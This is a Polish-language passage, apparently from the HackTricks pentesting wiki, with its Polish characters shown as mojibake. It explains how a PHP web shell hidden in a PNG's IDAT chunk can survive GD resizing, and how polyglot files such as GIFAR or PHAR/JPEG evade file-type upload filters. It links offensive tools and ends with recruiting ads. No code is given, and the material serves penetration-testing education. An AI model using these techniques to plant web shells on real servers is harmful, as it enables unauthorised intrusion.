Osadzenie powÅ‚oki PHP w segmencie IDAT pliku PNG moÅ¼e skutecznie ominÄ…Ä‡ pewne operacje przetwarzania obrazu. Funkcje `imagecopyresized` i `imagecopyresampled` z PHP-GD sÄ… szczegÃ³lnie istotne w tym kontekÅ›cie, poniewaÅ¼ sÄ… powszechnie uÅ¼ywane do zmiany rozmiaru i prÃ³bkowania obrazÃ³w. ZdolnoÅ›Ä‡ osadzonej powÅ‚oki PHP do pozostania niezmienionej podczas tych operacji stanowi znaczÄ…cÄ… zaletÄ™ w pewnych przypadkach uÅ¼ycia.

SzczegÃ³Å‚owe omÃ³wienie tej techniki, wraz z jej metodologiÄ… i potencjalnymi zastosowaniami, znajduje siÄ™ w nastÄ™pujÄ…cym artykule: ["Kodowanie powÅ‚ok internetowych w segmentach IDAT plikÃ³w PNG"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ten zasÃ³b oferuje kompleksowe zrozumienie procesu i jego implikacji.

WiÄ™cej informacji pod adresem: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Pliki poliglotyczne

Pliki poliglotyczne stanowiÄ… unikalne narzÄ™dzie w dziedzinie cyberbezpieczeÅ„stwa, dziaÅ‚ajÄ…c jak kameleon, ktÃ³ry moÅ¼e istnieÄ‡ jednoczeÅ›nie w wielu formatach plikÃ³w. ZainteresujÄ…cym przykÅ‚adem jest [GIFAR](https://en.wikipedia.org/wiki/Gifar), hybryda, ktÃ³ra peÅ‚ni funkcje zarÃ³wno pliku GIF, jak i archiwum RAR. Takie pliki nie sÄ… ograniczone do tej kombinacji; moÅ¼liwe sÄ… takÅ¼e poÅ‚Ä…czenia takie jak GIF i JS lub PPT i JS.

PodstawowÄ… uÅ¼ytecznoÅ›ciÄ… plikÃ³w poliglotycznych jest ich zdolnoÅ›Ä‡ do omijania Å›rodkÃ³w bezpieczeÅ„stwa, ktÃ³re przesiewajÄ… pliki na podstawie typu. PowszechnÄ… praktykÄ… w rÃ³Å¼nych aplikacjach jest zezwalanie tylko na okreÅ›lone typy plikÃ³w do przesyÅ‚ania - takie jak JPEG, GIF lub DOC - w celu zmniejszenia ryzyka zwiÄ…zanego z potencjalnie szkodliwymi formatami (np. JS, PHP lub plikami Phar). Jednak plik poliglotyczny, poprzez dostosowanie siÄ™ do kryteriÃ³w strukturalnych wielu typÃ³w plikÃ³w, moÅ¼e skutecznie ominÄ…Ä‡ te ograniczenia.

Mimo swojej elastycznoÅ›ci, pliki poliglotyczne napotykajÄ… pewne ograniczenia. Na przykÅ‚ad, chociaÅ¼ plik poliglotyczny moÅ¼e jednoczeÅ›nie reprezentowaÄ‡ plik PHAR (PHp ARchive) i JPEG, sukces jego przesÅ‚ania moÅ¼e zaleÅ¼eÄ‡ od polityk rozszerzeÅ„ plikÃ³w platformy. JeÅ›li system jest rygorystyczny w kwestii dozwolonych rozszerzeÅ„, sama strukturalna dwuistotnoÅ›Ä‡ pliku poliglotycznego moÅ¼e nie wystarczyÄ‡, by zagwarantowaÄ‡ jego przesÅ‚anie.

WiÄ™cej informacji pod adresem: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## OdnoÅ›niki

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

JeÅ›li interesuje CiÄ™ **kariera hakera** i hakiowanie rzeczy niemoÅ¼liwych - **rekrutujemy!** (_wymagana biegÅ‚a znajomoÅ›Ä‡ jÄ™zyka polskiego w mowie i piÅ›mie_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
